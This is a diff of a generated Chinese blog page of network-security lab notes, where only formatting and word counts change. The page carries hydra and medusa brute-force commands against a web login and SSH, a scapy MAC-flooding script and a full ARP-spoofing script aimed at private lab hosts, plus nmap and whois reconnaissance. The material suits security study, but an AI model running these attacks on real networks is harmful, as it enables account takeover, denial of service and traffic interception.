@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    993
+                    996
                 </div>
                 
 
@@ -504,9 +504,6 @@
         </div>
         <hr class="clearfix">
 
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -530,7 +527,7 @@
 <li><code>https:</code> SHA,RSA,AES</li>
 <li>对称加密：AES,DES,RC5</li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span></span><br><span class="line">pip uninstall crypto </span><br><span class="line">pip uninstall pycryptodome</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span></span><br><span class="line">pip uninstall crypto </span><br><span class="line">pip uninstall pycryptodome</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
 <h3 id="爆破woniusales系统">爆破woniusales系统</h3>
 <ol type="1">
 <li>爆破md5</li>
@@ -550,14 +547,14 @@
 <li><code>hydra</code></li>
 </ol>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -h</span><br><span class="line"></span><br><span class="line">hydra -s 8080 -l admin -P ./password-3000.txt 192.168.112.130 -m <span class="string">&quot;/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail&quot;</span> http-form-post</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line"></span><br><span class="line">hydra -s 8080 -l admin -P ./password-3000.txt 192.168.112.130 -m <span class="string">&quot;/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail&quot;</span> http-form-post</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/08/k8tY97DIjx4wiRZ.png"
 alt="hydra" />
 <figcaption aria-hidden="true">hydra</figcaption>
 </figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P ./password-3000.txt -vV -o ssh.log -e ns 192.168.112.118 ssh</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 192.168.112.188 -u root -p ./password-3000.txt -t 200 -M ssh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P ./password-3000.txt -vV -o ssh.log -e ns 192.168.112.118 ssh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.112.188 -u root -p ./password-3000.txt -t 200 -M ssh</span><br></pre></td></tr></table></figure>
 <blockquote>
 <ol start="2" type="1">
 <li><code>medusa</code></li>
@@ -582,7 +579,7 @@ alt="medusa" />
 <ol type="1">
 <li>使用<code>ping</code>, <code>import os</code></li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ping ......| findstr TTL</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ......| findstr TTL</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>注意防火墙</p>
 </blockquote>
@@ -590,26 +587,26 @@ alt="medusa" />
 <ol type="1">
 <li>监听流量、分析流量、编辑流量数据包（链路层、网络层、传输层</li>
 </ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">show_interfaces()</span><br><span class="line">pack=sniff(count=<span class="number">10</span>,iface=<span class="string">&#x27;VMware Virtual Ethernet Adapter for VMnet8&#x27;</span>)</span><br><span class="line">pack[<span class="number">0</span>].show()</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_interfaces()</span><br><span class="line">pack=sniff(count=<span class="number">10</span>,iface=<span class="string">&#x27;VMware Virtual Ethernet Adapter for VMnet8&#x27;</span>)</span><br><span class="line">pack[<span class="number">0</span>].show()</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/12/qHMoxSUEKaYcXRN.png"
 alt="image-20220809202221278" />
 <figcaption aria-hidden="true">image-20220809202221278</figcaption>
 </figure>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pack.summary()</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pack.summary()</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/09/1LFsnJxogDHByfq.png"
 alt="image-20220809203824463" />
 <figcaption aria-hidden="true">image-20220809203824463</figcaption>
 </figure>
 <p>​</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP())</span><br></pre></td></tr></table></figure>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 带载荷</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHHHHHH&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP())</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 带载荷</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHHHHHH&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>​</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHH&quot;</span>,inter=<span class="number">1</span>,count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pkg=sr1(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHJH&quot;</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IP().show()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pkg = IP(dst=<span class="string">&#x27;192.168.104.129&#x27;</span>)/TCP(dport=<span class="number">22</span>)</span><br><span class="line">sr1(pkg)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHH&quot;</span>,inter=<span class="number">1</span>,count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg=sr1(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHJH&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP().show()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg = IP(dst=<span class="string">&#x27;192.168.104.129&#x27;</span>)/TCP(dport=<span class="number">22</span>)</span><br><span class="line">sr1(pkg)</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/12/78QAoSVuz1Ihv2E.png"
 alt="image-20220809224546860" />
@@ -642,7 +639,7 @@ alt="image-20220810160144705" />
 <figcaption aria-hidden="true">image-20220810160144705</figcaption>
 </figure>
 <h3 id="nmap">nmap</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 网段/地址范围</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 网段/地址范围</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/10/LKekJzNAhCGtsrB.png"
 alt="image-20220810164036582" />
@@ -727,7 +724,7 @@ aria-hidden="true">https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png</figcaptio
 alt="image-20220810203827981" />
 <figcaption aria-hidden="true">image-20220810203827981</figcaption>
 </figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pyton-whois 库</span></span><br><span class="line"><span class="keyword">from</span> whois <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whois_info</span>():</span><br><span class="line">    result = whois(<span class="string">&#x27;woniuxy.com&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pyton-whois 库</span></span><br><span class="line"><span class="keyword">from</span> whois <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whois_info</span>():</span><br><span class="line">    result = whois(<span class="string">&#x27;woniuxy.com&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/10/LYZBXAivP91wjdb.png"
 alt="nslookup" />
@@ -756,14 +753,14 @@ target="_blank" rel="noopener" href="https://fofa.info/toLogin">click</a></p>
 <li>MAC地址泛洪</li>
 </ul>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali:macof</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:macof</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ol start="2" type="1">
 <li><code>vmWare</code>中的混杂模式</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernet0.noPromsic = &quot;TRUE&quot;    # 禁用</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethernet0.noPromsic = &quot;TRUE&quot;    # 禁用</span><br></pre></td></tr></table></figure>
 <h3 id="arp攻击与欺骗">ARP攻击与欺骗</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root -n  <span class="comment"># 查看网关</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root -n  <span class="comment"># 查看网关</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <ul>
 <li>kali (.129)攻击 win10(.131)</li>
@@ -798,7 +795,7 @@ alt="image-20220811161453521" />
 <blockquote>
 <p><code>driftnet</code>: 从发过来的流量中捕获图像并显示</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.sendrecv <span class="keyword">import</span> sendp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether, ARP</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    iface = <span class="string">&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;</span></span><br><span class="line">    <span class="comment"># 被攻击主机</span></span><br><span class="line">    target_ip = <span class="string">&#x27;192.168.104.131&#x27;</span></span><br><span class="line">    target_mac = <span class="string">&#x27;00:0C:29:E0:9C:B3&#x27;</span>		<span class="comment"># 网卡用“:”</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被攻击主机的MAC和IP,kali</span></span><br><span class="line">    spoof_ip = <span class="string">&#x27;192.168.104.129&#x27;</span></span><br><span class="line">    spoof_mac = <span class="string">&#x27;00:0c:29:8e:52:c1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 真实网关的MAC和IP</span></span><br><span class="line">    gateway_ip = <span class="string">&#x27;192.168.104.2&#x27;</span></span><br><span class="line">    gateway_mac = <span class="string">&#x27;00:50:56:ea:a2:db&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet,iface=iface)</span><br><span class="line"></span><br><span class="line">        packet = Ether(src=spoof_mac, dst=gateway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet, iface=iface)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arp_spoof()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.sendrecv <span class="keyword">import</span> sendp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether, ARP</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    iface = <span class="string">&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;</span></span><br><span class="line">    <span class="comment"># 被攻击主机</span></span><br><span class="line">    target_ip = <span class="string">&#x27;192.168.104.131&#x27;</span></span><br><span class="line">    target_mac = <span class="string">&#x27;00:0C:29:E0:9C:B3&#x27;</span>		<span class="comment"># 网卡用“:”</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被攻击主机的MAC和IP,kali</span></span><br><span class="line">    spoof_ip = <span class="string">&#x27;192.168.104.129&#x27;</span></span><br><span class="line">    spoof_mac = <span class="string">&#x27;00:0c:29:8e:52:c1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 真实网关的MAC和IP</span></span><br><span class="line">    gateway_ip = <span class="string">&#x27;192.168.104.2&#x27;</span></span><br><span class="line">    gateway_mac = <span class="string">&#x27;00:50:56:ea:a2:db&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet,iface=iface)</span><br><span class="line"></span><br><span class="line">        packet = Ether(src=spoof_mac, dst=gateway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet, iface=iface)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arp_spoof()</span><br></pre></td></tr></table></figure>
 <p>​</p>
 <h3 id="hping3和wrk泛洪">hping3和wrk泛洪</h3>
 <ol type="1">
@@ -829,7 +826,7 @@ alt="image-20220811173548351" />
 </ul>
 </blockquote>
 <h3 id="centos一些命令">CentOs一些命令</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uptime</span></span><br><span class="line">netstat -anutl</span><br><span class="line">firewall-cmd --add-port=80/tcp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uptime</span></span><br><span class="line">netstat -anutl</span><br><span class="line">firewall-cmd --add-port=80/tcp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"
 alt="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png" />
@@ -1476,7 +1473,7 @@ alt="image-20220812155722065" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">235.5k</span>&nbsp;字
+                class="white-color">236k</span>&nbsp;字
             
             
             
